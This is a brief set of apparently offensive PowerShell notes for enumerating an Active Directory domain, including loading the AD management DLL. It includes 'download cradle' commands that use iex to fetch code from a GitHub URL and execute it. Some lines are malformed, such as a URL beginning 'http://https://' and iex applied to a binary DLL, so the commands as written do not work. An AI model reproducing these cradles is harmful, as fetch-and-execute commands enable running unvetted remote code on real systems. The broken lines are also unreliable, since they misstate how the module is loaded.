
##### Without importing DLL
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()


##### Importing DLL (see file Microsoft.ActiveDirectory.Management.dll)
Download and cd to directory
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Download cradle --> https://github.com/pistelli32/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true
iex (New-Object Net.WebClient).DownloadString('https://github.com/pistelli32/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true')
iex (iwr http://https://github.com/pistelli32/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -UseBasicParsing)
